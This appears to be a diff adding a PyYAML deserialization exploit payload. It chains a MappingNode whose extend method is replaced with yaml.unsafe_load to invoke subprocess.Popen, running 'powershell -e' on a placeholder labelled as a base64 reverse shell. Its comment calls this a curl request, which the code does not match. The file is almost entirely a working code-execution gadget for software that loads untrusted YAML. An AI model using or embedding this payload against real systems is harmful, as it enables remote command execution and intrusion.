@@ -1,0 +1,9 @@
+# The `extend` function is overriden to run `yaml.unsafe_load` with 
+# custom `listitems` argument, in this case a simple curl request
+
+- !!python/object/new:yaml.MappingNode
+  listitems: !!str '!!python/object/apply:subprocess.Popen [["powershell", "-e", "b64 powershell revershell"]]'
+  state:
+    tag: !!str dummy
+    value: !!str dummy
+    extend: !!python/name:yaml.unsafe_load
